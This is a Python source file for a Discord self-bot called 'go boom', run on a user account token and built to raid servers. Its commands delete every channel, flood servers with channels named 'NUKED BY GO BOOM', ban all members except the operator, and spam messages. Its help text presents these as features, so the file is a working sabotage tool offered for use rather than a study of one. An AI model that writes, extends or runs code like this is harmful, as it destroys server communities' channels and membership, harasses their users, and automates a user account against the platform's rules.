import discord
from discord import *
from discord.ext import commands

title="""
              ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#        
Made by NotSuek
"""




bot = commands.Bot(".", self_bot=True)

@bot.event
async def on_ready():
    print("go boom ready ( ͡° ͜ʖ ͡°)")
    print(title)

@bot.command()
async def test(ctx, arg):
    await ctx.send(arg)

@bot.command()
async def helpSelfBot(ctx):
    embed = discord.Embed(title="Help | go boom Self-bot", description="Suek is trash at python", color=0x00ff00)
    embed.add_field(name=".test {message}", value="Will send {message}.", inline=False)
    embed.add_field(name=".death", value="Deletes all channels in the server.", inline=False)
    embed.add_field(name=".spam {amount} {name}", value="Creates {amount} channels named {name}.", inline=False)
    embed.add_field(name=".nuke {amount} {name}", value="Deletes all channels and creates {amount} channels named {name}.", inline=False)
    embed.add_field(name=".banNuke", value="Bans all users except the user running the bot.", inline=False)
    embed.add_field(name=".spamDM {message} {amount}", value="Spam DMs the current user selected with {message} {amount} times.", inline=False)
    await ctx.send(embed=embed)

@bot.command()
async def death(ctx):
    for channel in ctx.guild.channels:
        await channel.delete()

@bot.command()
async def spam(ctx, amount=5, name="NUKED BY GO BOOM"):
    for x in range(amount):
        guild = ctx.guild
        channel = await guild.create_text_channel(name)

@bot.command()
async def nuke(ctx, amount=10, name="NUKED BY GO BOOM"):
    for channel in ctx.guild.channels:
        await channel.delete()
    for x in range(amount):
        guild = ctx.guild
        channel = await guild.create_text_channel(name)

@bot.command()
async def banNuke(ctx):
    for user in ctx.guild.members:
        try:
            print(user)
            await user.ban()
        except:
            pass

@bot.command()
async def spamDM(ctx, args="GO BOOM ON TOP", amount=5):
    for x in range(amount):
        await ctx.send(args)

bot.run("your token goes here", bot=False)